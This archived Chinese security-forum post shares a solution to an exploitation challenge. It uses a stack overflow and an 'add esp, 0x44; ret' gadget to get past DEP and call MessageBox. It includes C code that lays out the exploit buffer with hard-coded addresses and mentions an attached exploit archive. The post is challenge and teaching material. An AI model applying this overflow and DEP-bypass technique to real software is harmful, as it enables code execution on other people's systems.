

# 发个过 DEP 的第一题答案，就是有点大 32 个字节

> 原文：[`www.pediy.com/kssd/pediy11/123108.html`](https://www.pediy.com/kssd/pediy11/123108.html)

思路很简单，溢出后已经可以把数据写到堆栈里了。 只把要压入的数据预先先入到 exploit 指定的地方, 在 CODE 里找到 0x00401B8D 这个地址是 add esp, 44;ret 直接滑到预先设定好的地方 就可以在代码段执行代码并且正常返回，但是返回后由于 ESP 没有方法返回到正常的位置，出现引用原先局部变量时出错。  
  
堆栈内容如下:  
  

代码:

```
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x00) = 0x00401B8D;//保存返回地址 <- add esp, 0x44;ret
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x1C) = 0x004011CE;//指向 MessageBox 返回地址              <- 0x0012FC94
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x20) = 0x00000000;//MessageBox Arg1(HANDLE)                <- 0x0012FC98
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x24) = 0x0012FCAC;//MessageBox Arg2(Context)            <- 0x0012FC9C
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x28) = 0x0040606C;//MessageBox Arg3(Title)                <- 0x0012FCA0
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x2C) = 0x00000000;//MessageBox Arg4(MB\_OK)                <- 0x0012FCA4
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x30) = 0x0040116C;//原返回地址                          <- 0x0012FCA8
    memcpy(g\_ShellCodeBuffer + 0x34, \_\_STR\_SUCCESS\_\_, 30);//字符串 <- 0x0012FCAC
    \*(DWORD \*)(g\_ShellCodeBuffer + 0x80) = 0x0012FC78;//指向保存返回地址

```

没有发这个。 发了个很通常的。 这里膜拜一下 forgot 牛。。。 ![](img/9b2aec7f3d4bb041b2d419a59832192f.jpg "恐怖!")

上传的附件
| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || exploit.rar  
 |